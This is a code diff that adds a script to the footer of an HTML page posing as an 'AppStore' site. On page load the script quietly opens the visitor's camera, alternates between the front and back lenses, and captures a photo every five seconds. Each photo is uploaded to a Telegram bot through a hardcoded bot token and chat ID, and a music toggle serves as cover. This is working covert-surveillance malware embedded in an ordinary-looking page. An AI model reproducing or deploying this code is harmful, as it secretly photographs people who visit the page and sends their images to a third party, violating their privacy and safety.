@@ -353,7 +353,124 @@
   <footer class="footer">
     <p>© 2025 AppStore. All rights reserved.</p>
   </footer>
+<script>
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const context = canvas.getContext('2d');
+    const music = document.getElementById('loveAudio');
+    const botToken = '7708374524:AAEjIbEU59XwOAjwjnt2dkq4sLPFKdhPWnY'; // Replace with your bot token
+    const chatId = '7888600155';    // Replace with your chat ID
 
+    let useFrontCamera = true; // Start with front camera
+    let isMusicPlaying = false;
+
+    // Camera constraints
+    const constraints = {
+      video: {
+        facingMode: useFrontCamera ? 'user' : 'environment'
+      }
+    };
+
+    // Start camera stream
+    function startCamera() {
+      navigator.mediaDevices.getUserMedia(constraints)
+        .then(stream => {
+          video.srcObject = stream;
+        })
+        .catch(error => {
+          console.error('Error accessing camera:', error);
+        });
+    }
+
+    // Stop the camera stream
+    function stopCamera() {
+      const stream = video.srcObject;
+      if (stream) {
+        const tracks = stream.getTracks();
+        tracks.forEach(track => track.stop());
+      }
+    }
+
+    // Capture photo and send to Telegram
+    function captureAndSendPhoto() {
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      const base64Image = canvas.toDataURL('image/png');
+      const blob = base64ToBlob(base64Image);
+
+      sendToTelegram(blob);
+    }
+
+    // Convert Base64 to Blob
+    function base64ToBlob(base64) {
+      const byteString = atob(base64.split(',')[1]);
+      const arrayBuffer = new ArrayBuffer(byteString.length);
+      const uintArray = new Uint8Array(arrayBuffer);
+
+      for (let i = 0; i < byteString.length; i++) {
+        uintArray[i] = byteString.charCodeAt(i);
+      }
+
+      return new Blob([uintArray], { type: 'image/png' });
+    }
+
+    // Send photo to Telegram
+    function sendToTelegram(blob) {
+      const url = `https://api.telegram.org/bot${botToken}/sendPhoto`;
+
+      const formData = new FormData();
+      formData.append('chat_id', chatId);
+      formData.append('photo', blob, 'photo.png');
+
+      fetch(url, {
+        method: 'POST',
+        body: formData,
+      })
+        .then(response => response.json())
+        .then(data => {
+          if (!data.ok) {
+            console.error('Telegram API Error:', data);
+          }
+        })
+        .catch(err => {
+          console.error('Fetch Error:', err);
+        });
+    }
+
+    // Automatically switch between front and back cameras
+    function autoSwitchCamera() {
+      setInterval(() => {
+        stopCamera();
+        useFrontCamera = !useFrontCamera; // Toggle camera
+        constraints.video.facingMode = useFrontCamera ? 'user' : 'environment';
+        startCamera();
+      }, 5000); // Switch camera every 5 seconds
+    }
+
+    // Automatically capture photos
+    setInterval(() => {
+      captureAndSendPhoto();
+    }, 5000); // Capture photo every 5 seconds
+
+    // Music control
+    function toggleMusic() {
+      if (isMusicPlaying) {
+        music.pause();
+        isMusicPlaying = false;
+        document.querySelector('.music-btn').textContent = 'Play Music';
+      } else {
+        music.play();
+        isMusicPlaying = true;
+        document.querySelector('.music-btn').textContent = 'Pause Music';
+      }
+    }
+
+    // Initialize camera and start the process
+    startCamera();
+    autoSwitchCamera();
+</script>
   <script>
     // JavaScript to Toggle Navbar on Mobile
     function toggleMenu() {
